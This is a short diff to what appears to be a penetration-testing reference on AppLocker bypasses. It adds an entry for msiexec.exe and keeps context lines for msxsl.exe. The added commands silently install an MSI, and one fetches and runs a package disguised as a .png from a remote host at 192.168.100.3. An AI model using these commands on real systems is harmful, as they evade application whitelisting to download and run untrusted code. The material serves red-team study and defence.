@@ -207,3 +207,13 @@ msxsl.exe customers.xml script.xsl
 Links:  
 https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
 https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1
+
+
+
+## 22. msiexec.exe
+
+msiexec /quiet /i cmd.msi
+msiexec /q /i http://192.168.100.3/tmp/cmd.png
+
+Links:  
+https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
